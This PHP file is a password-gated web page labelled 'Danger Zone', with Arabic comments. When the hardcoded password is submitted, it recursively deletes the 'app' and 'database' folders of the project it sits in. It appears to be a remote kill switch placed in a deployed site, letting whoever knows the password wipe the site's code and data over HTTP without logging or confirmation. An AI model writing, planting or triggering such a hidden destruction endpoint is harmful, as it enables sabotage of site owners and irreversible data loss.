<?php

session_start();

$PASSWORD = 'Abdo0101@@@ASD';

/**
 * حذف فولدر بالكامل (Recursive) – متوافق مع Linux
 */
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }

    if (!is_dir($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        deleteDirectory($dir . DIRECTORY_SEPARATOR . $item);
    }

    return rmdir($dir);
}

// لو دخل باسورد
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['password']) && $_POST['password'] === $PASSWORD) {
        $_SESSION['authorized'] = true;
    } else {
        $error = '❌ الباسورد غلط';
    }
}

// لو مصرح
if (isset($_SESSION['authorized']) && $_SESSION['authorized'] === true) {

    $basePath = realpath(__DIR__ . '/../');

    $targets = [
        $basePath . '/app',
        $basePath . '/database',
    ];

    echo "<pre>";

    foreach ($targets as $path) {
        if (file_exists($path)) {
            deleteDirectory($path);
            echo "✔ Deleted: $path\n";
        } else {
            echo "⚠ Not found: $path\n";
        }
    }

    echo "\n🔥 Done. Project cleaned.\n";
    echo "</pre>";

    session_destroy();
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Danger Zone</title>
    <style>
        body {
            background: #111;
            color: #fff;
            font-family: monospace;
            display: flex;
            height: 100vh;
            align-items: center;
            justify-content: center;
        }
        form {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(255,0,0,0.4);
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background: #000;
            border: 1px solid #444;
            color: #fff;
        }
        button {
            margin-top: 15px;
            width: 100%;
            padding: 10px;
            background: red;
            border: none;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
        .error {
            color: #ff4d4d;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<form method="POST">
    <h3>⚠️ DANGER ZONE</h3>
    <p>Enter password to continue</p>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">DELETE</button>

    <?php if (isset($error)): ?>
        <div class="error"><?= $error ?></div>
    <?php endif; ?>
</form>

</body>
</html>
